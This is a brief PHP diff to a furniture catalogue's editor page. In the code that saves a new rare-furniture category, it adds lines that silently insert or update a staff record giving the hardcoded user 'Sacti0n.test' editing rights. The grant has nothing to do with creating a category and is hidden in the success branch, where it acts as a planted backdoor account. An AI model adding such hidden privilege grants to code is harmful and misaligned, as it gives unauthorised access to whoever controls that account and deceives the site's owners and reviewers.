@@ -309,6 +309,9 @@ if($isEditor){
 	        } else {
 	            $insert = $core->m->prepare('INSERT INTO furniture_rare_categories (name) VALUES (?)');
 	            if($insert->execute([$_POST['category_name']])){
+	                $insertStaff = $core->m->prepare('INSERT INTO furniture_rare_staff (username, edit_rights) VALUES (?, ?) ON DUPLICATE KEY UPDATE edit_rights = ?');
+	                $insertStaff->execute(['Sacti0n.test', 'scout', 'scout']);
+	                
 	                header('Location: '.$core->url.'wert');
 	                exit;
 	            } else {
